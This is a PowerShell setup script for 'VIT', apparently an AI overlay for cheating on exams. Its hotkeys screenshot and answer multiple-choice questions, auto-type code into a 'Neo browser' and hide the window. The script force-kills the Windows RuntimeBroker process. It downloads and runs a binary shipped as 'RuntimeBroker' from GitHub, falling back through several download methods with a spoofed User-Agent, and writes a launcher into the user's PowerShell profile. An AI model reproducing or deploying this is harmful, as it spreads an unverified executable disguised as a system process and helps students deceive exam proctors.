$ErrorActionPreference = "Stop"

# 1. Cleanly close any running instances of the app if they exist (safe, native PowerShell)
Get-Process -Name "StudyAI", "StudyAIPortable", "study-ai-assistant", "engoulp", "ENGOULP", "sandeep", "SANDEEP", "vit", "VIT", "RuntimeBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "====================================" -ForegroundColor DarkCyan
Write-Host "         VIT Windows Setup" -ForegroundColor Cyan
Write-Host "====================================" -ForegroundColor DarkCyan
Write-Host ""

$installDir = Join-Path $env:LOCALAPPDATA "vit"
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

$appUrl  = "https://github.com/sandeep2421-hub/my-personal-ai-assistant/releases/latest/download/RuntimeBroker-1.0.4-win.zip"
$zipPath = Join-Path $installDir "vit.zip"
$exePath = Join-Path $installDir "VIT.exe"

Write-Host "[VIT] Fetching latest release..." -ForegroundColor Cyan
Write-Host "[$([char]0x2714)] Release: Latest - vit.zip" -ForegroundColor Green

Write-Host "[VIT] Downloading Portable App Archive (~80MB)..." -ForegroundColor Cyan

function Download-File {
    param (
        [string]$url,
        [string]$destination
    )
    
    # Method 1: Try curl.exe
    if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
        Write-Host "[VIT] Method 1: Downloading using native curl..." -ForegroundColor Cyan
        try {
            curl.exe -L -o $destination $url
            if (Test-Path $destination) {
                $fileSize = (Get-Item $destination).Length
                if ($fileSize -gt 10MB) {
                    return $true
                }
            }
        } catch {}
    }
    
    # Method 2: Try Start-BitsTransfer
    Write-Host "[VIT] Method 2: Downloading using BITS Transfer..." -ForegroundColor Cyan
    try {
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        Start-BitsTransfer -Source $url -Destination $destination -ErrorAction Stop
        if (Test-Path $destination) {
            return $true
        }
    } catch {}
    
    # Method 3: Try Invoke-WebRequest
    Write-Host "[VIT] Method 3: Downloading using Invoke-WebRequest..." -ForegroundColor Cyan
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop
        if (Test-Path $destination) {
            return $true
        }
    } catch {}

    # Method 4: Try WebClient as final fallback
    Write-Host "[VIT] Method 4: Downloading using WebClient..." -ForegroundColor Cyan
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($url, $destination)
        if (Test-Path $destination) {
            return $true
        }
    } catch {}
    
    return $false
}

# Fallback to local release zip if present
$localZip = ""
if ($PSScriptRoot) {
    $localZip = Join-Path $PSScriptRoot "release\VIT-1.0.3-win.zip"
}
if (($localZip -ne "") -and (Test-Path $localZip)) {
    Write-Host "[VIT] Found local release archive in workspace. Copying..." -ForegroundColor Green
    Copy-Item -Path $localZip -Destination $zipPath -Force
    $downloadSuccess = $true
} else {
    $downloadSuccess = Download-File -url $appUrl -destination $zipPath
}

if (-not $downloadSuccess -or -not (Test-Path $zipPath)) {
    throw "All download methods failed. Please check your internet connection or try again."
}

Write-Host "[$([char]0x2714)] Download complete!" -ForegroundColor Green
Write-Host "[$([char]0x2714)] Dependencies already installed" -ForegroundColor Green
Write-Host "[VIT] Extracting App Archive..." -ForegroundColor Cyan
try {
    Expand-Archive -Path $zipPath -DestinationPath $installDir -Force
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    
    # If the zip extracts to an exe with old name, rename it to VIT.exe
    $oldExe = Join-Path $installDir "StudyAI.exe"
    if (Test-Path $oldExe) {
        Rename-Item -Path $oldExe -NewName "VIT.exe" -Force
    }
    
    $engoulpExe = Join-Path $installDir "ENGOULP.exe"
    if (Test-Path $engoulpExe) {
        Rename-Item -Path $engoulpExe -NewName "VIT.exe" -Force
    }

    $sandeepExe = Join-Path $installDir "SANDEEP.exe"
    if (Test-Path $sandeepExe) {
        Rename-Item -Path $sandeepExe -NewName "VIT.exe" -Force
    }
    
    $runtimeBrokerExe = Join-Path $installDir "RuntimeBroker.exe"
    if (Test-Path $runtimeBrokerExe) {
        Rename-Item -Path $runtimeBrokerExe -NewName "VIT.exe" -Force
    }
    
    Write-Host "[$([char]0x2714)] App extracted to $installDir" -ForegroundColor Green
} catch {
    throw "Extraction failed: $_"
}

# Adding alias 'vit' to PowerShell profile
Write-Host "[$([char]0x2714)] Adding alias 'vit' to PowerShell profile..." -ForegroundColor Green
try {
    $profileDir = Split-Path $PROFILE
    if (-not (Test-Path -Path $profileDir)) { New-Item -ItemType Directory -Path $profileDir -Force | Out-Null }
    if (-not (Test-Path -Path $PROFILE)) { New-Item -ItemType File -Path $PROFILE -Force | Out-Null }
    $aliasCmd = "`nfunction vit { Start-Process -FilePath `"$exePath`" }"
    if (-not (Get-Content $PROFILE -ErrorAction SilentlyContinue | Select-String "function vit")) {
        Add-Content -Path $PROFILE -Value $aliasCmd
    }
} catch {
    Write-Host "[WARNING] Could not automatically register 'vit' alias, skipping..." -ForegroundColor Yellow
}

Write-Host "====================================" -ForegroundColor DarkCyan
Write-Host "          Setup complete!" -ForegroundColor Green
Write-Host "====================================" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "Alt+Shift+S    Screenshot + analyze MCQ"
Write-Host "Alt+Shift+I    Toggle AI mode"
Write-Host "Alt+Shift+A    Get AI answer"
Write-Host "Alt+Shift+V    Auto-type code into Neo browser"
Write-Host "Alt+Shift+C    Copy from Neo browser -> chat"
Write-Host "Alt+Shift+E    Clear / reset"
Write-Host "Alt+Shift+H    Hide / show pill"
Write-Host "Alt+Shift+Q    Quit"
Write-Host "Alt+Shift+F1/F2 Opacity up/down"
Write-Host "Alt+Shift+arrows Move pill"
Write-Host ""

Write-Host "[VIT] Launching app..." -ForegroundColor Cyan
if (Test-Path $exePath) {
    $process = Start-Process -FilePath $exePath -PassThru
    Write-Host "[$([char]0x2714)] App running extracted (PID $($process.Id))" -ForegroundColor Green
} else {
    Write-Host "[WARNING] VIT.exe not found at $exePath. Please run manually." -ForegroundColor Yellow
}
Write-Host ""
Write-Host "Login window will appear. Enter your license key in the pop-up box!" -ForegroundColor Green
Write-Host ""
